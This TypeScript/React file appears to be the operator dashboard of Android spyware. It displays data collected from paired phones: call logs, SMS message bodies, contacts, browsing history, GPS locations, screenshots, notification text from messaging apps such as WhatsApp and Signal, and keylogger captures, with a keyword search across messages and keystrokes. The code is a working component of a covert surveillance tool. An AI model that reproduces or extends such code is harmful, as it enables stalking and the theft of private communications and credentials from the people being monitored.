import { useEffect, useMemo, useState } from "react";
import {
  DeviceChips,
  useDeviceModules,
  useDevices,
  type ModuleEntry,
} from "./devices";
import { fmtDateTime, fmtRelative } from "./format";

/* ---------- helpers ---------- */

const num = (v: unknown): number => (typeof v === "number" ? v : Number(v) || 0);
const str = (v: unknown): string => (v === null || v === undefined ? "" : String(v));

export const fmtDuration = (sec: number): string => {
  if (!sec || sec < 0) return "—";
  const s = Math.floor(sec);
  const m = Math.floor(s / 60);
  const h = Math.floor(m / 60);
  if (h > 0) return `${h}h ${m % 60}m`;
  if (m > 0) return `${m}m ${s % 60}s`;
  return `${s}s`;
};

export const fmtAppTime = (ms: number): string => {
  if (!ms || ms < 0) return "—";
  const m = Math.floor(ms / 60000);
  if (m < 1) return "just now";
  const h = Math.floor(m / 60);
  if (h < 1) return `${m}m`;
  const d = Math.floor(h / 24);
  if (d < 1) return `${h}h ${m % 60}m`;
  return `${d}d ${h % 24}h`;
};

const CALL_TYPES: Record<number, string> = {
  1: "Incoming", 2: "Outgoing", 3: "Missed", 4: "Voicemail", 5: "Rejected", 6: "Blocked",
};
const SMS_TYPES: Record<number, string> = {
  1: "Inbox", 2: "Sent", 3: "Draft", 4: "Outbox", 5: "Failed", 6: "Queued",
};

export const APP_NAMES: Record<string, string> = {
  "com.whatsapp": "WhatsApp",
  "org.telegram.messenger": "Telegram",
  "com.facebook.orca": "Messenger",
  "com.facebook.katana": "Facebook",
  "com.instagram.android": "Instagram",
  "com.snapchat.android": "Snapchat",
  "com.zhiliaoapp.musically": "TikTok",
  "com.discord": "Discord",
  "com.viber.voip": "Viber",
  "org.thoughtcrime.securesms": "Signal",
  "com.skype.raider": "Skype",
  "com.twitter.android": "Twitter / X",
  "com.google.android.apps.messaging": "Messages (Google)",
  "com.samsung.android.messaging": "Messages (Samsung)",
  "com.android.mms": "Messages (AOSP)",
  "com.google.android.gm": "Gmail",
  "com.android.chrome": "Chrome",
  "org.mozilla.firefox": "Firefox",
  "com.microsoft.emmx": "Edge",
  "com.opera.browser": "Opera",
  "com.brave.browser": "Brave",
  "com.sec.android.app.sbrowser": "Samsung Internet",
};

export const appName = (pkg: unknown): string => {
  const p = str(pkg);
  return APP_NAMES[p] ?? p.replace(/^com\.|^org\./g, "").replace(/\./g, " ");
};

const typeBadge = (v: unknown): string => {
  const t = num(v);
  if (t === 0) return "";
  return CALL_TYPES[t] ?? SMS_TYPES[t] ?? `type ${t}`;
};

/* ---------- shared shell ---------- */

export function ModuleShell({
  token,
  onTokenExpired,
  title,
  desc,
  collections,
  now,
  selectedId,
  onSelect,
  children,
}: {
  token: string | null;
  onTokenExpired?: () => void;
  title: string;
  desc: string;
  collections: string[];
  now: number;
  selectedId: string | null;
  onSelect: (id: string) => void;
  children: (modules: Record<string, ModuleEntry[]>) => React.ReactNode;
}) {
  const { devices, loading, error: devicesError } = useDevices(token, onTokenExpired);
  const selected = devices.find((d) => d.deviceId === selectedId) ?? devices[0] ?? null;
  const { data, error, loading: modulesLoading } = useDeviceModules(
    token,
    selected?.deviceId ?? null,
    collections,
    onTokenExpired
  );

  return (
    <section className="view">
      <div className="view-head">
        <div>
          <h2>{title}</h2>
          <p className="muted">{desc}</p>
        </div>
        {!loading && !modulesLoading && (
          <span className={`pill ${devicesError || error ? "pill-offline" : "pill-online"}`}>
            <span className="pill-dot" />
            {devicesError || error ? "Sync error" : "Live"}
          </span>
        )}
      </div>

      {(devicesError || error) && (
        <p className="hint hint-error">Couldn’t load data: {devicesError || error}</p>
      )}

      {devices.length === 0 ? (
        <div className="empty-state">
          <span className="empty-icon">📱</span>
          <h3>No devices paired yet</h3>
          <p>Pair a device from the Devices section — module data starts flowing with the next sync.</p>
        </div>
      ) : (
        <>
          <DeviceChips devices={devices} selectedId={selected?.deviceId ?? null} onSelect={onSelect} now={now} />
          {children(data)}
        </>
      )}
    </section>
  );
}

export function EmptyModule({ what }: { what: string }) {
  return (
    <div className="chart-empty">
      No {what} collected yet — the app sends this data with every sync once permissions are granted.
    </div>
  );
}

/* ---------- generic list ---------- */

function ModuleTable({ entries, columns }: { entries: ModuleEntry[]; columns: Array<{ key: string; label: string; render: (e: ModuleEntry) => React.ReactNode }> }) {
  if (entries.length === 0) return <EmptyModule what="entries" />;
  return (
    <div className="module-table-wrap">
      <table className="module-table">
        <thead>
          <tr>{columns.map((c) => <th key={c.key}>{c.label}</th>)}</tr>
        </thead>
        <tbody>
          {entries.slice(0, 300).map((e, i) => (
            <tr key={`${e.t ?? ""}-${i}`}>
              {columns.map((c) => <td key={c.key}>{c.render(e)}</td>)}
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

/* ---------- specific modules ---------- */

export function CallsModule({ entries }: { entries: ModuleEntry[] }) {
  const sorted = useMemo(() => [...entries].sort((a, b) => num(b.t) - num(a.t)), [entries]);
  return (
    <div className="feed-card">
      <ModuleTable
        entries={sorted}
        columns={[
          {
            key: "name", label: "Contact",
            render: (e) => <strong>{str(e.name) || "Unknown"}</strong>,
          },
          { key: "number", label: "Number", render: (e) => <code>{str(e.number)}</code> },
          {
            key: "type", label: "Type",
            render: (e) => <span className="mod-chip">{typeBadge(e.type) || "—"}</span>,
          },
          { key: "duration", label: "Duration", render: (e) => fmtDuration(num(e.duration)) },
          { key: "date", label: "When", render: (e) => <time title={fmtDateTime(num(e.t))}>{fmtRelative(num(e.t), Date.now())}</time> },
        ]}
      />
    </div>
  );
}

export function MessagesModule({ entries }: { entries: ModuleEntry[] }) {
  const sorted = useMemo(() => [...entries].sort((a, b) => num(b.t) - num(a.t)), [entries]);
  if (sorted.length === 0) return <EmptyModule what="messages yet" />;
  return (
    <div className="feed-card">
      <ul className="msg-list">
        {sorted.slice(0, 300).map((e, i) => {
          const t = typeBadge(e.type);
          return (
            <li className="msg-item" key={`${e.t}-${i}`}>
              <div className="msg-head">
                <code>{str(e.address)}</code>
                {t && <span className={`mod-chip ${num(e.type) === 1 ? "chip-in" : ""}`}>{t}</span>}
                <time title={fmtDateTime(num(e.t))}>{fmtRelative(num(e.t), Date.now())}</time>
              </div>
              <p className="msg-body">{str(e.body)}</p>
            </li>
          );
        })}
      </ul>
    </div>
  );
}

export function ContactsModule({ entries }: { entries: ModuleEntry[] }) {
  const sorted = useMemo(
    () => [...entries].sort((a, b) => str(a.name).localeCompare(str(b.name))),
    [entries]
  );
  if (sorted.length === 0) return <EmptyModule what="contacts yet" />;
  return (
    <div className="contacts-grid">
      {sorted.slice(0, 400).map((e, i) => (
        <article className="contact-card" key={`${e.phoneHash ?? ""}-${i}`}>
          <span className="contact-avatar">{(str(e.name).charAt(0) || "?").toUpperCase()}</span>
          <div className="contact-meta">
            <strong>{str(e.name) || "Unknown"}</strong>
            <code>{str(e.phone)}</code>
          </div>
        </article>
      ))}
    </div>
  );
}

export function BrowserModule({ entries }: { entries: ModuleEntry[] }) {
  const sorted = useMemo(() => [...entries].sort((a, b) => num(b.t) - num(a.t)), [entries]);
  if (sorted.length === 0) return <EmptyModule what="browsing history yet" />;
  return (
    <div className="feed-card">
      <ul className="browser-list">
        {sorted.slice(0, 300).map((e, i) => (
          <li className="browser-item" key={`${e.t}-${i}`}>
            <div className="browser-head">
              <strong>{str(e.title) || "Untitled page"}</strong>
              <span className="mod-chip">{appName(e.package)}</span>
              <time title={fmtDateTime(num(e.t))}>{fmtRelative(num(e.t), Date.now())}</time>
            </div>
            <a className="browser-url" href={str(e.url)} target="_blank" rel="noopener noreferrer">
              {str(e.url)}
            </a>
          </li>
        ))}
      </ul>
    </div>
  );
}

export function AppsModule({ entries }: { entries: ModuleEntry[] }) {
  const sorted = useMemo(
    () =>
      [...entries]
        .filter((e) => str(e.package).length > 0)
        .sort((a, b) => num(b.totalTime) - num(a.totalTime)),
    [entries]
  );
  if (sorted.length === 0) return <EmptyModule what="app usage yet" />;
  return (
    <div className="battery-list-panel">
      <div className="battery-list">
        {sorted.slice(0, 200).map((e, i) => {
          const total = num(e.totalTime);
          const max = num(sorted[0]?.totalTime) || 1;
          return (
            <div className="app-row" key={`${e.package}-${i}`}>
              <code>{appName(e.package)}</code>
              <span className="app-row-track">
                <span className="app-row-fill" style={{ width: `${Math.max(2, (total / max) * 100)}%` }} />
              </span>
              <strong>{fmtAppTime(total)}</strong>
            </div>
          );
        })}
      </div>
    </div>
  );
}

export function LocationsModule({ entries }: { entries: ModuleEntry[] }) {
  const sorted = useMemo(() => [...entries].sort((a, b) => num(b.t) - num(a.t)), [entries]);
  if (sorted.length === 0) return <EmptyModule what="locations yet" />;
  return (
    <div className="feed-card">
      <ul className="loc-list">
        {sorted.slice(0, 200).map((e, i) => {
          const lat = num(e.latitude);
          const lng = num(e.longitude);
          const maps = `https://www.google.com/maps?q=${lat},${lng}`;
          return (
            <li className="loc-item" key={`${e.t}-${i}`}>
              <span className="loc-pin">📍</span>
              <div className="loc-meta">
                <code>
                  {lat.toFixed(5)}, {lng.toFixed(5)}
                </code>
                <span>
                  accuracy ±{Math.round(num(e.accuracy))}m · {str(e.provider) || "fused"} ·{" "}
                  <a href={maps} target="_blank" rel="noopener noreferrer">Open in Maps</a>
                </span>
                <time title={fmtDateTime(num(e.t))}>{fmtDateTime(num(e.t))}</time>
              </div>
            </li>
          );
        })}
      </ul>
    </div>
  );
}

export function MediaModule({ entries, kind }: { entries: ModuleEntry[]; kind: "photos" | "videos" | "screenshots" }) {
  const filtered = useMemo(() => {
    const mime = (e: ModuleEntry) => str(e.mime);
    return entries.filter((e) => {
      if (kind === "screenshots") return e.screenshot === true;
      if (kind === "photos") return e.screenshot !== true && mime(e).startsWith("image/");
      return e.screenshot !== true && mime(e).startsWith("video/");
    });
  }, [entries, kind]);
  const sorted = [...filtered].sort((a, b) => num(b.t) - num(a.t));
  if (sorted.length === 0) return <EmptyModule what={`${kind} yet`} />;
  return (
    <div className="media-grid">
      {sorted.slice(0, 300).map((e, i) => (
        <article className="media-card" key={`${e.t}-${i}`}>
          <span className="media-icon" aria-hidden="true">
            {kind === "videos" ? "🎬" : kind === "screenshots" ? "📸" : "🖼️"}
          </span>
          <div className="media-meta">
            <strong title={str(e.name)}>{str(e.name) || "Untitled"}</strong>
            <code>{str(e.mime)}</code>
            <time title={fmtDateTime(num(e.t))}>{fmtDateTime(num(e.t))}</time>
          </div>
        </article>
      ))}
    </div>
  );
}

export function KeylogModule({ entries }: { entries: ModuleEntry[] }) {
  const sorted = useMemo(() => [...entries].sort((a, b) => num(b.t) - num(a.t)), [entries]);
  if (sorted.length === 0) return <EmptyModule what="keylogger entries yet" />;
  return (
    <div className="feed-card">
      <ol className="timeline">
        {sorted.slice(0, 300).map((e, i) => (
          <li className="timeline-item" key={`${e.t}-${i}`}>
            <span className="timeline-dot" aria-hidden="true" />
            <div className="timeline-body">
              <div className="timeline-head">
                <span className="timeline-icon" aria-hidden="true">⌨️</span>
                <span className="timeline-label">{appName(e.package) || "Keylogger"}</span>
                {str(e.view_id) && <code className="timeline-device">{str(e.view_id)}</code>}
              </div>
              <p className="keylog-text">{str(e.text) || str(e.content) || "—"}</p>
              <time className="timeline-time" title={fmtDateTime(num(e.t))}>
                {fmtRelative(num(e.t), Date.now())}
              </time>
            </div>
          </li>
        ))}
      </ol>
    </div>
  );
}

export function NotificationsModule({ entries }: { entries: ModuleEntry[] }) {
  const sorted = useMemo(() => [...entries].sort((a, b) => num(b.t) - num(a.t)), [entries]);
  if (sorted.length === 0) return <EmptyModule what="notifications yet" />;
  return (
    <div className="feed-card">
      <ol className="timeline">
        {sorted.slice(0, 300).map((e, i) => (
          <li className="timeline-item" key={`${e.t}-${i}`}>
            <span className="timeline-dot" aria-hidden="true" />
            <div className="timeline-body">
              <div className="timeline-head">
                <span className="timeline-icon" aria-hidden="true">🔔</span>
                <span className="timeline-label">{appName(e.package)}</span>
                {str(e.title) && <strong className="notif-title">{str(e.title)}</strong>}
              </div>
              {str(e.text) && <p className="keylog-text">{str(e.text)}</p>}
              <time className="timeline-time" title={fmtDateTime(num(e.t))}>
                {fmtRelative(num(e.t), Date.now())}
              </time>
            </div>
          </li>
        ))}
      </ol>
    </div>
  );
}

export function EventsModule({ entries }: { entries: ModuleEntry[] }) {
  const sorted = useMemo(() => [...entries].sort((a, b) => num(b.t) - num(a.t)), [entries]);
  if (sorted.length === 0) return <EmptyModule what="events yet" />;
  return (
    <div className="feed-card">
      <ol className="timeline">
        {sorted.slice(0, 300).map((e, i) => (
          <li className="timeline-item" key={`${e.t}-${i}`}>
            <span className="timeline-dot" aria-hidden="true" />
            <div className="timeline-body">
              <div className="timeline-head">
                <span className="timeline-icon" aria-hidden="true">⚡</span>
                <span className="timeline-label">{str(e.type).replace(/_/g, " ")}</span>
                {str(e.package) && <code className="timeline-device">{appName(e.package)}</code>}
                {str(e.class) && <code className="timeline-device">{str(e.class)}</code>}
              </div>
              <time className="timeline-time" title={fmtDateTime(num(e.t))}>
                {fmtRelative(num(e.t), Date.now())}
              </time>
            </div>
          </li>
        ))}
      </ol>
    </div>
  );
}

export function SocialModule({ entries, pkg }: { entries: ModuleEntry[]; pkg: string }) {
  const sorted = useMemo(
    () =>
      [...entries]
        .filter((e) => str(e.package).includes(pkg))
        .sort((a, b) => num(b.t) - num(a.t)),
    [entries, pkg]
  );
  if (sorted.length === 0) return <EmptyModule what={`messages from ${appName(pkg)} yet`} />;
  return (
    <div className="feed-card">
      <ul className="msg-list">
        {sorted.slice(0, 300).map((e, i) => (
          <li className="msg-item" key={`${e.t}-${i}`}>
            <div className="msg-head">
              <strong>{appName(e.package)}</strong>
              {str(e.title) && <span className="notif-title">{str(e.title)}</span>}
              <time title={fmtDateTime(num(e.t))}>{fmtRelative(num(e.t), Date.now())}</time>
            </div>
            <p className="msg-body">{str(e.text) || str(e.content) || "—"}</p>
          </li>
        ))}
      </ul>
    </div>
  );
}

export function DeviceModule({ entries }: { entries: ModuleEntry[] }) {
  const latest = entries.length ? entries[entries.length - 1] : null;
  if (!latest) return <EmptyModule what="device info yet" />;
  const rows: Array<[string, string]> = [
    ["Manufacturer", str(latest.manufacturer)],
    ["Model", str(latest.model)],
    ["Device", str(latest.device)],
    ["Product", str(latest.product)],
    ["Android version", str(latest.androidVersion)],
    ["SDK", str(latest.sdkVersion)],
    ["SIM operator", str(latest.simOperator)],
    ["Network operator", str(latest.networkOperator)],
    ["Android ID", str(latest.androidId)],
    ["Battery", latest.batteryLevel ? `${str(latest.batteryLevel)}%` : "—"],
    ["Last reported", fmtDateTime(num(latest.ts))],
  ];
  return (
    <div className="device-info-panel">
      <dl className="device-info-grid">
        {rows.map(([k, v]) => (
          <div key={k}>
            <dt>{k}</dt>
            <dd>{v || "—"}</dd>
          </div>
        ))}
      </dl>
    </div>
  );
}

export function WifiModule({ entries }: { entries: ModuleEntry[] }) {
  const sorted = useMemo(() => [...entries].sort((a, b) => num(b.t) - num(a.t)), [entries]);
  if (sorted.length === 0) return <EmptyModule what="network info yet" />;
  return (
    <div className="feed-card">
      <ModuleTable
        entries={sorted}
        columns={[
          { key: "ssid", label: "Network", render: (e) => <strong>{str(e.ssid) || "—"}</strong> },
          { key: "type", label: "Type", render: (e) => <span className="mod-chip">{str(e.type)}</span> },
          { key: "ip", label: "IP", render: (e) => <code>{str(e.ip) || "—"}</code> },
          { key: "bssid", label: "BSSID", render: (e) => <code>{str(e.bssid) || "—"}</code> },
          { key: "t", label: "When", render: (e) => <time title={fmtDateTime(num(e.t))}>{fmtRelative(num(e.t), Date.now())}</time> },
        ]}
      />
    </div>
  );
}

export function KeywordsModule({ entries }: { entries: Record<string, ModuleEntry[]> }) {
  const [query, setQuery] = useState("");
  const [source, setSource] = useState<string>("all");
  const q = query.trim().toLowerCase();

  const haystack = useMemo(() => {
    const out: Array<{ src: string; t: number; text: string; meta: string }> = [];
    const push = (src: string, e: ModuleEntry) => {
      const text = str(e.body) || str(e.text) || str(e.content) || "";
      if (!text) return;
      out.push({ src, t: num(e.t), text, meta: str(e.address) || appName(e.package) || "" });
    };
    (entries.sms || []).forEach((e) => push("SMS", e));
    (entries.keylog || []).forEach((e) => push("Keylogger", e));
    (entries.notifications || []).forEach((e) => push("Notification", e));
    return out.sort((a, b) => b.t - a.t);
  }, [entries]);

  const results = useMemo(() => {
    const base = source === "all" ? haystack : haystack.filter((h) => h.src === source);
    if (!q) return base;
    return base.filter((h) => h.text.toLowerCase().includes(q));
  }, [haystack, q, source]);

  return (
    <div className="keywords-wrap">
      <div className="keywords-bar">
        <input
          className="keyword-input"
          type="search"
          placeholder="Search keywords across messages, keylogger and notifications…"
          value={query}
          onChange={(e) => setQuery(e.target.value)}
        />
        <select className="keyword-source" value={source} onChange={(e) => setSource(e.target.value)}>
          <option value="all">All sources</option>
          <option value="SMS">SMS</option>
          <option value="Keylogger">Keylogger</option>
          <option value="Notification">Notifications</option>
        </select>
      </div>
      <div className="feed-card">
        {results.length === 0 ? (
          <EmptyModule what={q ? `matches for “${query}”` : "text to search yet"} />
        ) : (
          <ol className="timeline">
            {results.slice(0, 200).map((r, i) => (
              <li className="timeline-item" key={`${r.t}-${i}`}>
                <span className="timeline-dot" aria-hidden="true" />
                <div className="timeline-body">
                  <div className="timeline-head">
                    <span className="mod-chip chip-in">{r.src}</span>
                    {r.meta && <code className="timeline-device">{r.meta}</code>}
                  </div>
                  <p className="keylog-text">
                    {q ? highlight(r.text, q) : r.text}
                  </p>
                  <time className="timeline-time" title={fmtDateTime(r.t)}>
                    {fmtRelative(r.t, Date.now())}
                  </time>
                </div>
              </li>
            ))}
          </ol>
        )}
      </div>
    </div>
  );
}

function highlight(text: string, q: string): React.ReactNode {
  const idx = text.toLowerCase().indexOf(q);
  if (idx < 0) return text;
  return (
    <>
      {text.slice(0, idx)}
      <mark className="kw-mark">{text.slice(idx, idx + q.length)}</mark>
      {text.slice(idx + q.length)}
    </>
  );
}

/* ---------- page wrappers ---------- */

export type ModulePageProps = {
  token: string | null;
  onTokenExpired?: () => void;
  title: string;
  desc: string;
  collections: string[];
  render: (entries: Record<string, ModuleEntry[]>) => React.ReactNode;
};

export function ModulePage({ token, onTokenExpired, title, desc, collections, render }: ModulePageProps) {
  const [now, setNow] = useState(() => Date.now());
  const [selectedId, setSelectedId] = useState<string | null>(null);

  useEffect(() => {
    const t = setInterval(() => setNow(Date.now()), 1000);
    return () => clearInterval(t);
  }, []);

  return (
    <ModuleShell
      token={token}
      onTokenExpired={onTokenExpired}
      title={title}
      desc={desc}
      collections={collections}
      now={now}
      selectedId={selectedId}
      onSelect={setSelectedId}
    >
      {render}
    </ModuleShell>
  );
}
